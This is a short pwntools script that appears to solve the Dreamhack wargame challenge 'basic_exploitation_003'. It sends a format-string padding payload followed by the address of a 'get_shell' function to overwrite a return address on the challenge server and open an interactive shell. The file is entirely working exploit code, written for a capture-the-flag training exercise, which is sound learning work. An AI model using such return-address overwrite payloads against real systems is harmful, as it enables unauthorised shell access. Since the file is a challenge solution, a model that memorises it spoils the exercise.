from pwn import *

context.arch = "i386"

p = remote("host3.dreamhack.games", 12200)
elf = ELF("./basic_exploitation_003")

get_shell = elf.symbols['get_shell']
# get_shell = 0x8048669

# return_address - $rsp = 164
# &stack_buf - $rsp = 8 : [rsp + 0x8]
# return_address - &stack_buf = 156

payload = b"%156c"
# payload = b"%156c%3$n"
payload += p32(get_shell)

p.send(payload)
p.interactive()
